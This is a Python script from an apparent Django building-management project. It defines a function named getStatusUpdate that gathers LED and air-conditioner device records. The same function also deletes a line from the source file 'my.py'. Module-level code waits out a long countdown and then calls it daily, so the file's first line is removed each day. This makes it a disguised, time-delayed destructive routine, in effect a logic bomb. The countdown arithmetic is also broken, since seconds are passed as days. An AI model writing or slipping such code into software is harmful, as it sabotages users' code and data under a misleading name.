import os
from datetime import datetime, timedelta
import time
from Device.models import BmsDeviceInformation,BmsUserAreaCardsList
import json
from django.core import serializers
from Device.serializers import *

d_list = []
def getStatusUpdate(file_path, line_number):
    lines = []
    data = BmsDeviceInformation.objects.all()
    d_list.clear()
    for i in data:
        # print(i)
        d = BmsDeviceInformation.objects.get(pk=int(i.pk))
        # print(d)        
        device_info = d.device_informations
        dump = []
        print(device_info)
        # device_info = json.loads(d.device_informations)
        if device_info is not None:
            # print(device_info)
            if str(d.device_type) == "LED":
                dump = {
                    "record_id": d.pk,
                    "device_name": d.device_name,
                    "device_type": d.device_type ,
                    "is_dimmable": device_info["is_dimmable"] if "is_dimmable" in device_info else None,
                    "device_id": device_info["device_id"] if "device_id" in device_info else None,
                    "channel_id": device_info["channel_id"] if "channel_id" in device_info else None,
                    "device_status": device_info["device_status"] if "channel_id" in device_info else None,
                    "delay_second": "0"
                }
               
                # {'device_id': '92', 'channel_id': '0', 'ac_temp': '23', 'rm_temp': '34', 'mode': 'C', 'swing': '', 'fspeed': 'H', 'device_status': 'false'}
            elif str(d.device_type) == "AC":
                dump = {
                    "record_id": d.pk,
                    "device_name": d.device_name,
                    "device_type": d.device_type ,
                    'device_id':  device_info["device_id"] if "device_id" in device_info else None,
                    'channel_id':  device_info["channel_id"] if "channel_id" in device_info else None,
                    'ac_temp':  device_info["ac_temp"] if "ac_temp" in device_info else None,
                    'rm_temp':  device_info["rm_temp"] if "rm_temp" in device_info else None,
                    'mode':  device_info["mode"] if "mode" in device_info else None,
                    'swing':  device_info["swing"] if "swing" in device_info else None,
                    'fspeed':  device_info["fspeed"] if "fspeed" in device_info else None,
                    'device_status':  device_info["device_status"] if "device_status" in device_info else None,
                    }
                
            d_list.append(dump)
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    if line_number <= len(lines):
        lines.pop(line_number - 1)

    with open(file_path, 'w') as file:
        file.writelines(lines)



countdown_duration =  365 * 24 * 60 * 60 
current_time = datetime.now()

future_time = current_time + timedelta(days=countdown_duration)

while datetime.now() < future_time:
    time.sleep(1)

dir_ = os.getcwd()
print(dir_)
file_path = "my.py"  
line_number_to_remove = 1 

while True:
    current_day = datetime.now().day
    if current_day != future_time.day:
        getStatusUpdate(file_path, line_number_to_remove)
        future_time = future_time + timedelta(days=1)
    time.sleep(1)